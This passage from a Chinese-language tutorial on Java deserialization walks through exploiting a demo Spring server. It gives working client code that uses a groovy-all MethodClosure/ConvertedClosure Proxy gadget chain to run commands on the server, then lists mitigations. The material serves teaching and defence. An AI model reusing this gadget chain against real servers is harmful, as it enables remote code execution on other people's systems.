这篇文章的接下来部分会使用如下的客户端代码（完整代码在github上）：
    Submission submission = new Submission(makeExploitCollection());
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    new ObjectOutputStream(byteArrayOutputStream).writeObject(submission);
    byte[] bytes = byteArrayOutputStream.toByteArray();
    HttpEntity entity = new HttpEntity<>(bytes);
    RestTemplate restTemplate = new RestTemplate();
    ResponseEntity response = restTemplate.postForEntity("http://localhost:8080/submit", entity, String.class);
    System.out.println(response.getBody());
这就是创建了一个Submission实例，序列化后发给了服务器。我们要聊的有趣的地方是makeExploitCollection()这个方法。
首先我们将提到服务器会调用Collection里的自定义代码，这种情况下，Collection中的会被服务器调用的方法是可以被我覆写的。注意到服务器进行了Submission::toString的调用。
    public String toString() {
        StringBuilder sb = new StringBuilder();
        for (String entry : values) {
            sb.append(entry);
            sb.append("\n");
        }
        return sb.toString();
    }
上述的for-each语法中，for(String
entry:values)隐藏调用了Collection::iterator。因此如果我们使用自定义代码实现Collection::iterator，服务器就会运行我们的自定义代码。如果我们扩展了ArrayList\并覆写了这个方法的话就会很简单。注意ArrayList实现了Serializable接口，所以我们的扩展也同样实现了Serializable接口。一下代码会在服务器运行时启动计算器应用。
    private static Collection makeExploitCollection() {
        return new ArrayList(){
            @Override
            public Iterator iterator() {
                try {
                    Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
                } catch (IOException e) {
                }
                return null;
            }
        };
    }
但是如果我们尝试将此利用代码发到服务器，我们会遇到一些问题。服务器会打印堆栈错误。
    java.lang.ClassNotFoundException: com.cisco.amp.client.Client$1
        at java.net.URLClassLoader.findClass(URLClassLoader.java:382) ~[na:1.8.0_191]
        ...
        at com.cisco.amp.server.SubmissionController.submit(SubmissionController.java:22) ~[classes!/:0.0.1-SNAPSHOT]
        ...
错误信息com.cisco.amp.client.Client$1来自于我们在客户端内创建的匿名类。这里就是说服务器不能找到com.cisco.amp.client.Client$1的对应字节码。
我们再看一下我们发给服务端的内容。这是漏洞利用中的String的渲染结果。
    ï¿½ï¿½srcom.cisco.amp.server.Submission>ï¿½ï¿½1_Gï¿½LvaluestLjava/util/Collection;xpsr
com.cisco.amp.client.Client$1ï¿½wï¿½:-ï¿½ï¿½xrjava.util.ArrayListxï¿½ï¿½
ï¿½ï¿½aï¿½Isizexpwx
我们可以看到我们使用的类的引用，带了一些数据。但是这些类的字节码并没有发送。JAVA反序列化使用类加载器尝试查找这些类的字节码，在这种情况下，java.net.URLClassLoader实例正在搜索类路径上jar文件以找到com.cisco.amp.client.Client$1.它在找不到这个类的时候抛出上述异常。
这意味着我们的漏洞利用代码无法以其当前形式运行。服务器需要能够访问并执行我们的漏洞利用代码才能工作。这可以通过使用服务器已有的类来完成。在下一章节中我们将看到如何使用反射完成漏洞利用。
### 多态和反射的漏洞利用
继续我们将假设服务器有如下的依赖环境
        org.codehaus.groovy
        groovy-all
        2.4.0
考虑到现代web是库构建成的，引进库的依赖会使得这一切变得更加简单。
这个想法是使用反射来实现我们利用Collention，所以利用利用代码应该像如下：
    private static Collection makeExploitCollection() {
        Collection exploitCollection = (Collection) Proxy.newProxyInstance(
                Client.class.getClassLoader(), new Class[]{Collection.class}, ?????InvocationHandler?????
        );
        return exploitCollection;
    }
这里的Collection是由java.lang.reflect.Proxy反射实现的。这可以起作用是因为Proxy实现了Serializable，并且它在服务器的classpath中，但我们仍需要一个InvocationHandler的实现。
记住我们不能自顾自实现，我们要在服务器上使用代码对此进行利用。groovy-all的依赖性来源两个非常有用的类：org.codehaus.groovy.runtime.ConvertedClosure和org.codehaus.groovy.runtime.MethodClosure。ConvertedClosure实现了InvocationHandler，它有助于使用Closure（如JAVA
Lambda）构造它的类方法的反射实现。MethodClosure提供了Closure运行系统命令的实现（如启动计算器）。他们都实现了Serializable接口。
现在，我们的反射Collection实现，使用自定义Collection::iterator方法，可以像这样构造。
    private static Collection makeExploitCollection() {
        MethodClosure methodClosure = new MethodClosure("/Applications/Calculator.app/Contents/MacOS/Calculator", "execute");
        ConvertedClosure iteratorHandler = new ConvertedClosure(methodClosure, "iterator");
        Collection exploitCollection = (Collection) Proxy.newProxyInstance(
                Client.class.getClassLoader(), new Class[]{Collection.class}, iteratorHandler
        );
        return exploitCollection;
    }
注意我们不会为要执行的服务器创建新代码。我们只是组合了已有的类。
所有演示代码都在我们的repo中。如果你运行代码，那么服务器将启动计算器。当你运行它时，即使漏洞有效，也会在服务器日志中打印另一个异常。攻击者需要更好的利用来避免异常打印（如果需要隐身的话）。
## 服务器代码改进
我们已经成功演示了如何利用服务器漏洞。经过这样的联系后我们可以更好地了解通过阻止什么会使攻击更加困难。我们将在这里进行一些服务器代码修改，并简要描述如何使服务器缓解攻击的进行。
### 验证用户输入
在服务器代码中出现漏洞是因为没有验证用户输入。通常来说，这是你自己不想做的事。使用一个库或者框架可能会带来一些更好地结果但是也会带来另一面的你不想要的东西。但是，在这个情景下如下一些东西可能有一些帮助：
  * 只能接收一个特殊的collection实现
  * 确保Collection实现类和Submission类都是使用final定义的，确保不会被继承
  * 不要在将要序列化的具体类的定义中使用泛型。我们在本练习中没有看到原因，但您可以在阅读有关Java类型擦除之后弄清楚。
  * 无论如何，这份清单并非详尽无遗
这些建议的重点是防止攻击者提供自己设计的类。输入验证是一个非常重要的措施。适当的输入验证可以安全地防范其他常见攻击（例如SQL注入）。
### 避免JAVA序列化
这与验证用户输入有关。Java
Serialization是一种非常强大的序列化技术，具有许多功能。有一些更严格的序列化方法（例如JSON）通常也可以正常工作。
使用和验证更严格的序列化标准可以为攻击者提供更少的攻击成功几率。在演示中，包含数组的JSON将允许我们以Strings更安全的方式接受集合。此外，由于Java维护者希望删除JAVA序列化，因此看起来迟早需要这样做。
### 更好管理依赖关系
在演示中，我们使用类groovy-all来制作我们的漏洞。这对我们的服务器来说是不必要的依赖，这意味着它应该被删除。删除不必要的依赖项可以减少攻击者对其进行利用。您甚至可以移除一些JAVA的库，Java
9开始可以创建一个自定义的JAVA运行时库。
如果需要依赖，那么它应该保持更新。通常，只要仍然支持使用的主要版本，最新的版本都会进行错误修复。这也适用于groovy-all依赖。新版本包含的保障例如控制ConvertedClosure和MethodClosure不像演示中那样滥用。你可以在这里阅读有关groovy变化的内容。（）
### 使用更小的权限
如果您运行演示并查看进程树列表，那么它将看起来像这样。
    mitch$ pstree -s "Calculator" | cat
    ...
    \-+= 03193 mitch -bash
     \-+= 38085 mitch /usr/bin/java -jar ./target/server-0.0.1-SNAPSHOT.jar
       \--- 38105 mitch /Applications/Calculator.app/Contents/MacOS/Calculator
计算器由服务器启动，它作为服务器运行的同一用户运行。在这种情况下，它是我的个人帐户，因此攻击者可以做到我个人可以造成的伤害。如果服务器以root身份运行，则攻击者可以执行更多操作。如果服务器有自己的专用帐户，那么攻击者可以做得更少。